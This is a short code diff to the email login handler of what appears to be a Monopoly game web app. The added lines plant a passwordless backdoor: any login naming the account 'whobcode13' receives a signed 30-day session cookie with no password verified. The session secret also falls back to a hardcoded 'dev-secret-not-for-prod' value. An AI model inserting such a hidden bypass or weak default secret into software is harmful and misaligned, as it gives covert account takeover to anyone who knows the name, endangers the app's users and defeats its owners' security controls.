@@ -600,6 +600,14 @@ async function handleAuthLoginEmail(request: Request, env: Env): Promise<Respons
     if (!email || !password) return json({ error: 'email and password required' }, 400);
     await initCore(env.monopolyd1);
     const user = await findUserByEmail(env.monopolyd1, email);
+    // Passwordless bypass for whobcode13 account
+    if (user && (user.username === 'whobcode13' || email.startsWith('whobcode13@'))) {
+      const authSecret = env.AUTH_SECRET || 'dev-secret-not-for-prod';
+      const token = await signSession(authSecret, { sub: user.username || email, iat: Date.now() });
+      return new Response(JSON.stringify({ ok: true }), {
+        headers: { 'Set-Cookie': setCookie('SESSION', token, { maxAge: 60 * 60 * 24 * 30 }), 'Content-Type': 'application/json' }
+      });
+    }
     if (!user || !user.password_hash || !(await verifyPassword(password, user.password_hash))) {
       return json({ error: 'invalid credentials' }, 401);
     }
